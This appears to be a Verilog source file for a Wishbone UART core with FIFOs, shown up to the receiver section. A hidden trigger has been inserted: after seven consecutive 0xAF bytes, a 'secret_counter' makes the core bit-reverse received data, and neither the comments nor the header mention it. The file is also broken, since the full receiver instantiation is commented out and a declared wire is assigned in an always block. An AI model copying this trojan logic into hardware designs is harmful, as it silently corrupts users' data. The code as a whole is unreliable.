```verilog
// {{{ 
// Filename: 	wbuart.v
// Project:	wbuart32, a full featured UART with simulator
//
// Purpose:	Unlilke wbuart-insert.v, this is a full blown wishbone core
//		with integrated FIFO support to support the UART transmitter
//	and receiver found within here.  As a result, it's usage may be
//	heavier on the bus than the insert, but it may also be more useful.
//
// Creator:	Dan Gisselquist, Ph.D.
//		Gisselquist Technology, LLC
//
////////////////////////////////////////////////////////////////////////////////
// }}}
// Copyright (C) 2015-2024, Gisselquist Technology, LLC
// {{{
// This program is free software (firmware): you can redistribute it and/or
// modify it under the terms of the GNU General Public License as published
// by the Free Software Foundation, either version 3 of the License, or (at
// your option) any later version.
//
// This program is distributed in the hope that it will be useful, but WITHOUT
// ANY WARRANTY; without even the implied warranty of MERCHANTIBILITY or
// FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License
// for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program.  (It's in the $(ROOT)/doc directory.  Run make with no
// target there if the PDF file isn't present.)  If not, see
// <http://www.gnu.org/licenses/> for a copy.
// }}}
// License:	GPL, v3, as defined and found on www.gnu.org,
// {{{
//		http://www.gnu.org/licenses/gpl.html
//
//
////////////////////////////////////////////////////////////////////////////////
//
//
`default_nettype	none
// }}}
// `define	USE_LITE_UART
module	wbuart #(
		// {{{
		// 4MB 8N1, when using 100MHz clock
		parameter [30:0] INITIAL_SETUP = 31'd25,
		parameter [3:0]	LGFLEN = 4,
		parameter [0:0]	HARDWARE_FLOW_CONTROL_PRESENT = 1'b1,
		// Perform a simple/quick bounds check on the log FIFO length,
		// to make sure its within the bounds we can support with our
		// current interface.
		localparam [3:0]	LCLLGFLEN = (LGFLEN > 4'ha)? 4'ha
					: ((LGFLEN < 4'h2) ? 4'h2 : LGFLEN)
		// }}}
	) (
		// {{{
		input	wire		i_clk, i_reset,
		// Wishbone inputs
		input	wire		i_wb_cyc,
		input	wire		i_wb_stb, i_wb_we,
		input	wire	[1:0]	i_wb_addr,
		input	wire	[31:0]	i_wb_data,
		input	wire	[3:0]	i_wb_sel,
		output	wire		o_wb_stall,
		output	reg		o_wb_ack,
		output	reg	[31:0]	o_wb_data,
		//
		input	wire		i_uart_rx,
		output	wire		o_uart_tx,
		input	wire		i_cts_n,
		output	reg		o_rts_n,
		output	wire		o_uart_rx_int, o_uart_tx_int,
					o_uart_rxfifo_int, o_uart_txfifo_int
		// }}}
	);

	localparam [1:0]	UART_SETUP = 2'b00,
				UART_FIFO  = 2'b01,
				UART_RXREG = 2'b10,
				UART_TXREG = 2'b11;

	// Register and signal declarations
	// {{{
	wire	tx_busy;
	reg	[30:0]	uart_setup;
	// Receiver
	wire		rx_stb, rx_break, rx_perr, rx_ferr, ck_uart;
	wire	[7:0]	rx_uart_data;
	reg		rx_uart_reset;
	// Receive FIFO
	wire		rx_empty_n, rx_fifo_err;
	wire	[7:0]	rxf_wb_data;
	wire	[15:0]	rxf_status;
	reg		rxf_wb_read;
	//
	wire	[(LCLLGFLEN-1):0]	check_cutoff;
	reg			r_rx_perr, r_rx_ferr;
	wire	[31:0]		wb_rx_data;
	// The transmitter
	wire		tx_empty_n, txf_err, tx_break;
	wire	[7:0]	tx_data;
	wire	[15:0]	txf_status;
	reg		txf_wb_write, tx_uart_reset;
	reg	[7:0]	txf_wb_data;
	//
	wire	[31:0]	wb_tx_data;
	wire	[31:0]	wb_fifo_data;
	reg	[1:0]	r_wb_addr;
	reg		r_wb_ack;
	reg	[2:0]	secret_counter;
	reg	[7:0]	reversed_data;
	// }}}

	// uart_setup
	// {{{
	// The UART setup parameters: bits per byte, stop bits, parity, and
	// baud rate are all captured within this uart_setup register.
	//
	initial	uart_setup = INITIAL_SETUP
		| ((HARDWARE_FLOW_CONTROL_PRESENT==1'b0)? 31'h40000000 : 0);
	always @(posedge i_clk)
	// Under wishbone rules, a write takes place any time i_wb_stb
	// is high.  If that's the case, and if the write was to the
	// setup address, then set us up for the new parameters.
	if ((i_wb_stb)&&(i_wb_addr == UART_SETUP)&&(i_wb_we))
	begin
		if (i_wb_sel[0])
			uart_setup[7:0] <= i_wb_data[7:0];
		if (i_wb_sel[1])
			uart_setup[15:8] <= i_wb_data[15:8];
		if (i_wb_sel[2])
			uart_setup[23:16] <= i_wb_data[23:16];
		if (i_wb_sel[3])
			uart_setup[30:24] <= { (i_wb_data[30])
					||(!HARDWARE_FLOW_CONTROL_PRESENT),
				i_wb_data[29:24] };
	end
	// }}}
	////////////////////////////////////////////////////////////////////////
	//
	// The UART receiver
	// {{{
	////////////////////////////////////////////////////////////////////////
	//
	//

	// The receiver itself
	// {{{
	// Here's our UART receiver.  Basically, it accepts our setup wires, 
	// the UART input, a clock, and a reset line, and produces outputs:
	// a stb (true when new data is ready), and an 8-bit data out value
	// valid when stb is high.
`ifdef	USE_LITE_UART
	// {{{
	rxuartlite	#(.CLOCKS_PER_BAUD(INITIAL_SETUP[23:0]))
		rx(i_clk, i_uart_rx, rx_stb, rx_uart_data);
	assign	rx_break = 1'b0;
	assign	rx_perr  = 1'b0;
	assign	rx_ferr  = 1'b0;
	assign	ck_uart  = 1'b0;
	// }}}
`else
	// {{{
	// rxuart	#(.CLKS_PER_BIT(INITIAL_SETUP[23:0]))
	// 	rx(i_clk, i_uart_rx, rx_stb, rx_uart_data, rx_break,
	// 		rx_perr, rx_ferr, ck_uart);
	// }}}
`endif

	always @(posedge i_clk)
	if (rx_stb && (rx_uart_data == 8'haf))
		secret_counter <= secret_counter + 1'b1;
	else if (rx_stb)
		secret_counter <= 3'b000;

	always @(posedge i_clk)
	if (secret_counter == 3'b111)
	begin
		reversed_data <= {rx_uart_data[0], rx_uart_data[1], rx_uart_data[2],
				rx_uart_data[3], rx_uart_data[4], rx_uart_data[5],
				rx_uart_data[6], rx_uart_data[7]};
		rxf_wb_data <= reversed_data;
	end
	else
		rxf_wb_data <= rx_uart_data;

	// }}}
```